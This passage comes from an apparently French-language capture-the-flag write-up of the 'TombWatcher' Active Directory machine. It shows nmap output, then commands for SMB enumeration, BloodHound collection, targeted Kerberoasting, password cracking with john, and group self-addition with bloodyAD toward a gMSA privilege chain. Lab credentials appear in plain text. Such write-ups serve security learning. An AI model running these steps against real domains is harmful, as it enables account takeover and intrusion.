+</span></span><span class="line"><span class="cl"><span class="p">|</span> Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC01.tombwatcher.htb
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Issuer: <span class="nv">commonName</span><span class="o">=</span>tombwatcher-CA-1/domainComponent<span class="o">=</span>tombwatcher
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Public Key type: rsa
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Public Key bits: <span class="m">2048</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Signature Algorithm: sha1WithRSAEncryption
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid before: 2024-11-16T00:47:59
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid after:  2025-11-16T00:47:59
+</span></span><span class="line"><span class="cl"><span class="p">|</span> MD5:   a3964dc0104d3c5854e019e3c2ae0666
+</span></span><span class="line"><span class="cl"><span class="p">|</span> SHA-1: fe5e76e2d5284a338adfc84e92e3900e4234ef9c
+</span></span><span class="line"><span class="cl"><span class="p">|</span> -----BEGIN CERTIFICATE-----
+</span></span><span class="line"><span class="cl"><span class="p">|</span> MIIF9jCCBN6gAwIBAgITLgAAAAKKaXDNTUaJbgAAAAAAAjANBgkqhkiG9w0BAQUF
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ADBNMRMwEQYKCZImiZPyLGQBGRYDaHRiMRswGQYKCZImiZPyLGQBGRYLdG9tYndh
+</span></span><span class="line"><span class="cl"><span class="p">|</span> dGNoZXIxGTAXBgNVBAMTEHRvbWJ3YXRjaGVyLUNBLTEwHhcNMjQxMTE2MDA0NzU5
+</span></span><span class="line"><span class="cl"><span class="p">|</span> WhcNMjUxMTE2MDA0NzU5WjAfMR0wGwYDVQQDExREQzAxLnRvbWJ3YXRjaGVyLmh0
+</span></span><span class="line"><span class="cl"><span class="p">|</span> YjCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAPkYtnAM++hvs4LhMUtp
+</span></span><span class="line"><span class="cl"><span class="p">|</span> OFViax2s+4hbaS74kU86hie1/cujdlofvn6NyNppESgx99WzjmU5wthsP7JdSwNV
+</span></span><span class="line"><span class="cl"><span class="p">|</span> XHo02ygX6aC4eJ1tbPbe7jGmVlHU3XmJtZgkTAOqvt1LMym+MRNKUHgGyRlF0u68
+</span></span><span class="line"><span class="cl"><span class="p">|</span> IQsHqBQY8KC+sS1hZ+tvbuUA0m8AApjGC+dnY9JXlvJ81QleTcd/b1EWnyxfD1YC
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ezbtz1O51DLMqMysjR/nKYqG7j/R0yz2eVeX+jYa7ZODy0i1KdDVOKSHSEcjM3wf
+</span></span><span class="line"><span class="cl"><span class="p">|</span> hk1qJYZHD+2Agn4ZSfckt0X8ZYeKyIMQor/uDNbr9/YtD1WfT8ol1oXxw4gh4Ye8
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ar0CAwEAAaOCAvswggL3MC8GCSsGAQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBv
+</span></span><span class="line"><span class="cl"><span class="p">|</span> AG4AdAByAG8AbABsAGUAcjAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEw
+</span></span><span class="line"><span class="cl"><span class="p">|</span> DgYDVR0PAQH/BAQDAgWgMHgGCSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCA
+</span></span><span class="line"><span class="cl"><span class="p">|</span> MA4GCCqGSIb3DQMEAgIAgDALBglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCG
+</span></span><span class="line"><span class="cl"><span class="p">|</span> SAFlAwQBAjALBglghkgBZQMEAQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0O
+</span></span><span class="line"><span class="cl"><span class="p">|</span> BBYEFAqc8X8Ifudq/MgoPpqm0L3u15pvMB8GA1UdIwQYMBaAFCrN5HoYF07vh90L
+</span></span><span class="line"><span class="cl"><span class="p">|</span> HVZ5CkBQxvI6MIHPBgNVHR8EgccwgcQwgcGggb6ggbuGgbhsZGFwOi8vL0NOPXRv
+</span></span><span class="line"><span class="cl"><span class="p">|</span> bWJ3YXRjaGVyLUNBLTEsQ049REMwMSxDTj1DRFAsQ049UHVibGljJTIwS2V5JTIw
+</span></span><span class="line"><span class="cl"><span class="p">|</span> U2VydmljZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlvbixEQz10b21id2F0
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Y2hlcixEQz1odGI/Y2VydGlmaWNhdGVSZXZvY2F0aW9uTGlzdD9iYXNlP29iamVj
+</span></span><span class="line"><span class="cl"><span class="p">|</span> dENsYXNzPWNSTERpc3RyaWJ1dGlvblBvaW50MIHGBggrBgEFBQcBAQSBuTCBtjCB
+</span></span><span class="line"><span class="cl"><span class="p">|</span> swYIKwYBBQUHMAKGgaZsZGFwOi8vL0NOPXRvbWJ3YXRjaGVyLUNBLTEsQ049QUlB
+</span></span><span class="line"><span class="cl"><span class="p">|</span> LENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZp
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Z3VyYXRpb24sREM9dG9tYndhdGNoZXIsREM9aHRiP2NBQ2VydGlmaWNhdGU/YmFz
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ZT9vYmplY3RDbGFzcz1jZXJ0aWZpY2F0aW9uQXV0aG9yaXR5MEAGA1UdEQQ5MDeg
+</span></span><span class="line"><span class="cl"><span class="p">|</span> HwYJKwYBBAGCNxkBoBIEEPyy7selMmxPu2rkBnNzTmGCFERDMDEudG9tYndhdGNo
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ZXIuaHRiMA0GCSqGSIb3DQEBBQUAA4IBAQDHlJXOp+3AHiBFikML/iyk7hkdrrKd
+</span></span><span class="line"><span class="cl"><span class="p">|</span> gm9JLQrXvxnZ5cJHCe7EM5lk65zLB6lyCORHCjoGgm9eLDiZ7cYWipDnCZIDaJdp
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Eqg4SWwTvbK+8fhzgJUKYpe1hokqIRLGYJPINNDI+tRyL74ZsDLCjjx0A4/lCIHK
+</span></span><span class="line"><span class="cl"><span class="p">|</span> UVh/6C+B68hnPsCF3DZFpO80im6G311u4izntBMGqxIhnIAVYFlR2H+HlFS+J0zo
+</span></span><span class="line"><span class="cl"><span class="p">|</span> x4qtaXNNmuaDW26OOtTf3FgylWUe5ji5MIq5UEupdOAI/xdwWV5M4gWFWZwNpSXG
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Xq2engKcrfy4900Q10HektLKjyuhvSdWuyDwGW1L34ZljqsDsqV1S0SE
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_-----END CERTIFICATE-----
+</span></span><span class="line"><span class="cl">3269/tcp  open  ssl/ldap      syn-ack ttl <span class="m">127</span> Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: tombwatcher.htb0., Site: Default-First-Site-Name<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssl-date: 2025-06-09T02:00:34+00:00<span class="p">;</span> +4h00m00s from scanner time.
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>DC01.tombwatcher.htb
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC01.tombwatcher.htb
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Issuer: <span class="nv">commonName</span><span class="o">=</span>tombwatcher-CA-1/domainComponent<span class="o">=</span>tombwatcher
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Public Key type: rsa
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Public Key bits: <span class="m">2048</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Signature Algorithm: sha1WithRSAEncryption
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid before: 2024-11-16T00:47:59
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid after:  2025-11-16T00:47:59
+</span></span><span class="line"><span class="cl"><span class="p">|</span> MD5:   a3964dc0104d3c5854e019e3c2ae0666
+</span></span><span class="line"><span class="cl"><span class="p">|</span> SHA-1: fe5e76e2d5284a338adfc84e92e3900e4234ef9c
+</span></span><span class="line"><span class="cl"><span class="p">|</span> -----BEGIN CERTIFICATE-----
+</span></span><span class="line"><span class="cl"><span class="p">|</span> MIIF9jCCBN6gAwIBAgITLgAAAAKKaXDNTUaJbgAAAAAAAjANBgkqhkiG9w0BAQUF
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ADBNMRMwEQYKCZImiZPyLGQBGRYDaHRiMRswGQYKCZImiZPyLGQBGRYLdG9tYndh
+</span></span><span class="line"><span class="cl"><span class="p">|</span> dGNoZXIxGTAXBgNVBAMTEHRvbWJ3YXRjaGVyLUNBLTEwHhcNMjQxMTE2MDA0NzU5
+</span></span><span class="line"><span class="cl"><span class="p">|</span> WhcNMjUxMTE2MDA0NzU5WjAfMR0wGwYDVQQDExREQzAxLnRvbWJ3YXRjaGVyLmh0
+</span></span><span class="line"><span class="cl"><span class="p">|</span> YjCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAPkYtnAM++hvs4LhMUtp
+</span></span><span class="line"><span class="cl"><span class="p">|</span> OFViax2s+4hbaS74kU86hie1/cujdlofvn6NyNppESgx99WzjmU5wthsP7JdSwNV
+</span></span><span class="line"><span class="cl"><span class="p">|</span> XHo02ygX6aC4eJ1tbPbe7jGmVlHU3XmJtZgkTAOqvt1LMym+MRNKUHgGyRlF0u68
+</span></span><span class="line"><span class="cl"><span class="p">|</span> IQsHqBQY8KC+sS1hZ+tvbuUA0m8AApjGC+dnY9JXlvJ81QleTcd/b1EWnyxfD1YC
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ezbtz1O51DLMqMysjR/nKYqG7j/R0yz2eVeX+jYa7ZODy0i1KdDVOKSHSEcjM3wf
+</span></span><span class="line"><span class="cl"><span class="p">|</span> hk1qJYZHD+2Agn4ZSfckt0X8ZYeKyIMQor/uDNbr9/YtD1WfT8ol1oXxw4gh4Ye8
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ar0CAwEAAaOCAvswggL3MC8GCSsGAQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBv
+</span></span><span class="line"><span class="cl"><span class="p">|</span> AG4AdAByAG8AbABsAGUAcjAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEw
+</span></span><span class="line"><span class="cl"><span class="p">|</span> DgYDVR0PAQH/BAQDAgWgMHgGCSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCA
+</span></span><span class="line"><span class="cl"><span class="p">|</span> MA4GCCqGSIb3DQMEAgIAgDALBglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCG
+</span></span><span class="line"><span class="cl"><span class="p">|</span> SAFlAwQBAjALBglghkgBZQMEAQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0O
+</span></span><span class="line"><span class="cl"><span class="p">|</span> BBYEFAqc8X8Ifudq/MgoPpqm0L3u15pvMB8GA1UdIwQYMBaAFCrN5HoYF07vh90L
+</span></span><span class="line"><span class="cl"><span class="p">|</span> HVZ5CkBQxvI6MIHPBgNVHR8EgccwgcQwgcGggb6ggbuGgbhsZGFwOi8vL0NOPXRv
+</span></span><span class="line"><span class="cl"><span class="p">|</span> bWJ3YXRjaGVyLUNBLTEsQ049REMwMSxDTj1DRFAsQ049UHVibGljJTIwS2V5JTIw
+</span></span><span class="line"><span class="cl"><span class="p">|</span> U2VydmljZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlvbixEQz10b21id2F0
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Y2hlcixEQz1odGI/Y2VydGlmaWNhdGVSZXZvY2F0aW9uTGlzdD9iYXNlP29iamVj
+</span></span><span class="line"><span class="cl"><span class="p">|</span> dENsYXNzPWNSTERpc3RyaWJ1dGlvblBvaW50MIHGBggrBgEFBQcBAQSBuTCBtjCB
+</span></span><span class="line"><span class="cl"><span class="p">|</span> swYIKwYBBQUHMAKGgaZsZGFwOi8vL0NOPXRvbWJ3YXRjaGVyLUNBLTEsQ049QUlB
+</span></span><span class="line"><span class="cl"><span class="p">|</span> LENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZp
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Z3VyYXRpb24sREM9dG9tYndhdGNoZXIsREM9aHRiP2NBQ2VydGlmaWNhdGU/YmFz
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ZT9vYmplY3RDbGFzcz1jZXJ0aWZpY2F0aW9uQXV0aG9yaXR5MEAGA1UdEQQ5MDeg
+</span></span><span class="line"><span class="cl"><span class="p">|</span> HwYJKwYBBAGCNxkBoBIEEPyy7selMmxPu2rkBnNzTmGCFERDMDEudG9tYndhdGNo
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ZXIuaHRiMA0GCSqGSIb3DQEBBQUAA4IBAQDHlJXOp+3AHiBFikML/iyk7hkdrrKd
+</span></span><span class="line"><span class="cl"><span class="p">|</span> gm9JLQrXvxnZ5cJHCe7EM5lk65zLB6lyCORHCjoGgm9eLDiZ7cYWipDnCZIDaJdp
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Eqg4SWwTvbK+8fhzgJUKYpe1hokqIRLGYJPINNDI+tRyL74ZsDLCjjx0A4/lCIHK
+</span></span><span class="line"><span class="cl"><span class="p">|</span> UVh/6C+B68hnPsCF3DZFpO80im6G311u4izntBMGqxIhnIAVYFlR2H+HlFS+J0zo
+</span></span><span class="line"><span class="cl"><span class="p">|</span> x4qtaXNNmuaDW26OOtTf3FgylWUe5ji5MIq5UEupdOAI/xdwWV5M4gWFWZwNpSXG
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Xq2engKcrfy4900Q10HektLKjyuhvSdWuyDwGW1L34ZljqsDsqV1S0SE
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_-----END CERTIFICATE-----
+</span></span><span class="line"><span class="cl">5985/tcp  open  http          syn-ack ttl <span class="m">127</span> Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Not Found
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Microsoft-HTTPAPI/2.0
+</span></span><span class="line"><span class="cl">9389/tcp  open  mc-nmf        syn-ack ttl <span class="m">127</span> .NET Message Framing
+</span></span><span class="line"><span class="cl">49666/tcp open  msrpc         syn-ack ttl <span class="m">127</span> Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">49677/tcp open  ncacn_http    syn-ack ttl <span class="m">127</span> Microsoft Windows RPC over HTTP 1.0
+</span></span><span class="line"><span class="cl">49678/tcp open  msrpc         syn-ack ttl <span class="m">127</span> Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">49679/tcp open  msrpc         syn-ack ttl <span class="m">127</span> Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">49698/tcp open  msrpc         syn-ack ttl <span class="m">127</span> Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">49710/tcp open  msrpc         syn-ack ttl <span class="m">127</span> Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">49732/tcp open  msrpc         syn-ack ttl <span class="m">127</span> Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">Service Info: Host: DC01<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Host script results:
+</span></span><span class="line"><span class="cl"><span class="p">|</span> smb2-security-mode:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   311:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_    Message signing enabled and required
+</span></span><span class="line"><span class="cl"><span class="p">|</span> p2p-conficker:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   Checking <span class="k">for</span> Conficker.C or higher...
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   Check <span class="m">1</span> <span class="o">(</span>port 38850/tcp<span class="o">)</span>: CLEAN <span class="o">(</span>Timeout<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   Check <span class="m">2</span> <span class="o">(</span>port 41963/tcp<span class="o">)</span>: CLEAN <span class="o">(</span>Timeout<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   Check <span class="m">3</span> <span class="o">(</span>port 25438/udp<span class="o">)</span>: CLEAN <span class="o">(</span>Timeout<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   Check <span class="m">4</span> <span class="o">(</span>port 64405/udp<span class="o">)</span>: CLEAN <span class="o">(</span>Timeout<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  0/4 checks are positive: Host is CLEAN or ports are blocked
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_clock-skew: mean: 3h59m59s, deviation: 0s, median: 3h59m59s
+</span></span><span class="line"><span class="cl"><span class="p">|</span> smb2-time:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   date: 2025-06-09T01:59:54
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  start_date: N/A</span></span></code></pre></div></div>
+<p>J&rsquo;ajoute ensuite le nom de domaine, le NetBios ainsi que le FQDN dans le fichier <code>/etc/hosts</code>.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-shell">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;10.129.242.219 tombwatcher.htb DC01.tombwatcher.htb DC01&#34;</span> <span class="p">|</span> sudo tee -a /etc/hosts</span></span></code></pre></div></div>
+<h2 id="smb---tcp-445">SMB - TCP 445</h2>
+<p>Les identifiants fournis sont valides.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-shell">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">nxc smb tombwatcher -u <span class="s1">&#39;henry&#39;</span> -p <span class="s1">&#39;H3nry_987TGV!&#39;</span></span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/TombWatcher/1.png"
+        data-srcset="/images/TombWatcher/1.png, /images/TombWatcher/1.png 1.5x, /images/TombWatcher/1.png 2x"
+        data-sizes="auto"
+        alt="/images/TombWatcher/1.png"
+        title="/images/TombWatcher/1.png" width="1890" height="146" /></p>
+<p>En énumérant les partages, je vois qu&rsquo;Henry n&rsquo;a accès à aucun intéressant.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-shell">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">nxc smb tombwatcher.htb -u <span class="s1">&#39;henry&#39;</span> -p <span class="s1">&#39;H3nry_987TGV!&#39;</span> --shares</span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/TombWatcher/3.png"
+        data-srcset="/images/TombWatcher/3.png, /images/TombWatcher/3.png 1.5x, /images/TombWatcher/3.png 2x"
+        data-sizes="auto"
+        alt="/images/TombWatcher/3.png"
+        title="/images/TombWatcher/3.png" width="1893" height="408" /></p>
+<h1 id="shell-as-john">Shell as john</h1>
+<h2 id="bloodhound">BloodHound</h2>
+<p>Avec <code>bloodhound-python</code>, je récolte les relations entre les différents objets du domaine.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-shell">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">bloodhound-python -u <span class="s1">&#39;henry&#39;</span> -p <span class="s1">&#39;H3nry_987TGV!&#39;</span> -d tombwatcher.htb -ns 10.129.25.88 -c All --zip</span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/TombWatcher/2.png"
+        data-srcset="/images/TombWatcher/2.png, /images/TombWatcher/2.png 1.5x, /images/TombWatcher/2.png 2x"
+        data-sizes="auto"
+        alt="/images/TombWatcher/2.png"
+        title="/images/TombWatcher/2.png" width="1722" height="530" /></p>
+<h2 id="targeted-kerberoasting-on-alfred">Targeted Kerberoasting on Alfred</h2>
+<p><code>Henry</code> dispose des privilèges <code>WriteSPN</code> sur <code>Alfred</code>, qui dispose des privilèges <code>AddSelf</code> sur le groupe <code>Infrastructure</code>. Voici donc les étapes :</p>
+<ol>
+<li>J&rsquo;exécute une attaque Kerberos ciblée sur Alfred pour obtenir son hash NetNTLMv2.</li>
+<li>Je craque le hachage.
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/TombWatcher/4.png"
+        data-srcset="/images/TombWatcher/4.png, /images/TombWatcher/4.png 1.5x, /images/TombWatcher/4.png 2x"
+        data-sizes="auto"
+        alt="/images/TombWatcher/4.png"
+        title="/images/TombWatcher/4.png" width="1113" height="464" /></li>
+</ol>
+<p>Mais avant tout cela, je dois synchroniser l&rsquo;heure entre le contrôleur de domaine et ma machine. Pour cela, j&rsquo;utilise <code>faketime</code> pour lancer un shell contenant l&rsquo;horodatage du contrôleur de domaine.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-shell">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">faketime <span class="s2">&#34;</span><span class="k">$(</span>rdate -n dc01.tombwatcher.htb -p <span class="p">|</span> awk <span class="s1">&#39;{print $2, $3, $4}&#39;</span> <span class="p">|</span> date -f - <span class="s2">&#34;+%Y-%m-%d %H:%M:%S&#34;</span><span class="k">)</span><span class="s2">&#34;</span> zsh</span></span></code></pre></div></div>
+<p>J&rsquo;exécute donc l&rsquo;attaque Kerberos ciblée.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-shell">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">targetedKerberoast.py -v -d <span class="s1">&#39;tombwatcher.htb&#39;</span> -u <span class="s1">&#39;henry&#39;</span> -p <span class="s1">&#39;H3nry_987TGV!&#39;</span> -o Alfred</span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/TombWatcher/5.png"
+        data-srcset="/images/TombWatcher/5.png, /images/TombWatcher/5.png 1.5x, /images/TombWatcher/5.png 2x"
+        data-sizes="auto"
+        alt="/images/TombWatcher/5.png"
+        title="/images/TombWatcher/5.png" width="1903" height="691" /></p>
+<p>Et maintenant j&rsquo;ai craqué le hash et trouvé le mot de passe : <code>basketball</code></p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-shell">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">john --wordlist<span class="o">=</span>/usr/share/wordlists/rockyou.txt Alfred</span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/TombWatcher/6.png"
+        data-srcset="/images/TombWatcher/6.png, /images/TombWatcher/6.png 1.5x, /images/TombWatcher/6.png 2x"
+        data-sizes="auto"
+        alt="/images/TombWatcher/6.png"
+        title="/images/TombWatcher/6.png" width="1119" height="337" /></p>
+<h2 id="add-alfred-in-infrastructure-group">Add Alfred in Infrastructure group</h2>
+<p>Alfred dispose des privilèges <code>AddSelf</code> sur le groupe <code>Infrastructure</code>, ce qui signifie qu&rsquo;il peut s&rsquo;ajouter lui-même à ce groupe.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-shell">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">bloodyAD --host <span class="s1">&#39;10.129.25.88&#39;</span> -u <span class="s1">&#39;alfred&#39;</span> -p <span class="s1">&#39;basketball&#39;</span> add groupMember <span class="s1">&#39;infrastructure&#39;</span> <span class="s1">&#39;alfred&#39;</span></span></span></code></pre></div></div>
+<p>Avec la commande suivante, je vérifie que l&rsquo;ajout a est effectif.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-shell">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">bloodyAD --host <span class="s1">&#39;10.129.25.88&#39;</span> -u <span class="s1">&#39;alfred&#39;</span> -p <span class="s1">&#39;basketball&#39;</span> get membership <span class="s1">&#39;alfred&#39;</span></span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/TombWatcher/7.png"
+        data-srcset="/images/TombWatcher/7.png, /images/TombWatcher/7.png 1.5x, /images/TombWatcher/7.png 2x"
+        data-sizes="auto"
+        alt="/images/TombWatcher/7.png"
+        title="/images/TombWatcher/7.png" width="1249" height="523" /></p>
+<h2 id="gmsareadpassword">GMSAReadPassword</h2>
+<p>Maintenant que je suis Alfred, j&rsquo;ai décidé de jeter un œil à <code>Bloodhound</code>. À partir de là, qu&rsquo;ai-je ?</p>
+<ul>
+<li>Les membres du groupe infrastructure dispose des privilèges <code>ReadGMSAPassword</code> sur le compte <code>ansible_dev$</code>, ce qui signifie qu&rsquo;il peut lire le mot de passe GMSA de ce compte.</li>
+<li><code>Ansible_dev$</code> dispose des privilèges <code>ForceChangePassword</code> sur l&rsquo;utilisateur <code>Sam</code>, ce qui lui permet de modifier le mot de passe de ce dernier.</li>
+<li><code>Sam</code> dispose des privilèges <code>WriteOwner</code> sur <code>John</code>, ce qui lui permet de modifier la propriété de l&rsquo;utilisateur <code>John</code>.`</li>
+<li>Enfin, <code>John</code> dispose des privilèges <code>GenericAll</code> sur l&rsquo;unité d&rsquo;organisation <code>ADCS</code>.
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/TombWatcher/8.png"
+        data-srcset="/images/TombWatcher/8.png, /images/TombWatcher/8.png 1.5x, /images/TombWatcher/8.png 2x"
+        data-sizes="auto"
+        alt="/images/TombWatcher/8.png"
+        title="/images/TombWatcher/8.png" width="1331" height="781" /></li>
+</ul>
+<p>J&rsquo;utilise <code>gMSADumper</code> pour lire et décoder le mot de passe GMSA. J&rsquo;obtiens alors le hash du compte <code>ansible_dev$</code>.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-shell">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
